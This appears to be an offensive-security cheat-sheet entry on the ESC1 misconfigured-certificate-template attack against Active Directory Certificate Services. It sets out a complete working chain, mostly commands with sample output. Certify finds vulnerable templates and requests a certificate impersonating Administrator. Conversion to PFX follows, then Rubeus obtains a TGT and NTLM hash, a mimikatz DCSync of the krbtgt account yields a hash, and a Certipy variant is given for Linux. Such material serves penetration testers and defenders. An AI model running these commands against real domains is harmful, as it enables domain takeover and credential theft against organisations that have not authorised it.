title: ESC1: Misconfigured Certificate Templates
html:
Conditions: CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT flag set on template + Client Auth EKU + Domain Users have enrollment rights + no manager approval required. Allows any domain user to request a certificate for ANY user (e.g., Administrator).

Step 1 — Enumerate Vulnerable Templates

Certify.exe find /vulnerable /enabled /enrolleeSuppliesSubject
Certify.exe find /vulnerable /enabled /enrolleeSuppliesSubject

[!] Vulnerable Certificates Templates :

    CA Name                       : <domain>\<ca>
    Template Name                 : ESC1
    Schema Version                : 2
    Validity Period               : 1 year
    msPKI-Certificate-Name-Flag   : ENROLLEE_SUPPLIES_SUBJECT (0x1)
    pkiextendedkeyusage           : Client Authentication
    Permissions
      Enrollment Rights           : ESSOS\Domain Users        Access: Allow

Step 2 — Request Certificate with Arbitrary SAN

Certify.exe request /ca:<ca-host>\<ca-name> /template:<template> /altname:<domain>\<target-user> /sid:<admin-sid>
Certify.exe request /ca:<domain>\<ca> /template:ESC1 /altname:<domain>\<username> /sid:S-1-5-21-1394808576-3393508183-1134699666-500

[*] Action: Request a Certificates
[*] Current user context    : ESSOS\missandei
[*] Template                : ESC1
[*] AltName                 : <domain>\<username>
[*] CA Response             : The certificate has been issued.
[*] Request ID              : 7

[*] cert.pem                :
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA...
-----END CERTIFICATE-----

[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

Step 3 — Convert to PFX

# Method 1 — OpenSSL
openssl pkcs12 -in cert.pem -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out <target-user>.pfx

# Method 2 — certutil
certutil -MergePFX .\cert.pem .\<target-user>.pfx
# Method 1 (OpenSSL):
openssl pkcs12 -in cert.pem -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out administrator.pfx

# Method 2 (certutil):
certutil -MergePFX .\cert.pem .\administrator.pfx

Step 4 — Authenticate and Get TGT

# Get NTLM hash directly
Rubeus.exe asktgt /user:<target-user> /certificate:<target-user>.pfx /getcredentials

# Or get TGT only
Rubeus.exe asktgt /user:<target-user> /certificate:<target-user>.pfx /password:mimikatz
Rubeus.exe asktgt /user:administrator /certificate:administrator.pfx /getcredentials

[*] Action: Ask TGT
[*] Using PKINIT with etype rc4_hmac
[+] TGT request successful!

  UserName                 : administrator
  UserRealm                : <domain>
  Flags                    : name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  : rc4_hmac

Step 5 — DCSync via PTT

Rubeus.exe ptt /ticket:<ticket-b64>
mimikatz.exe "lsadump::dcsync /domain:<domain> /user:krbtgt"
Rubeus.exe ptt /ticket:doIFujCCBbagAwIBBaEDAgEW...
[+] Ticket successfully imported!

mimikatz.exe "lsadump::dcsync /domain:<domain> /user:krbtgt"
[DC] '<domain>' will be the domain

Credentials:
  Hash NTLM: a577fcf16cfef780a2ceb343ec39a0d9

Alternative — Certipy (Linux)

certipy req -u <username>@<domain> -p <password> -dc-ip <dc-ip> -target <ca-host> -template <template> -ca <ca-name> -upn <target-user>@<domain>
certipy auth -pfx <target-user>.pfx -dc-ip <dc-ip>
excerpt: Conditions: CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT flag set on template + Client Auth EKU + Domain Users have enrollment rights + no manager approval required. Allows any domain user to request a certifica
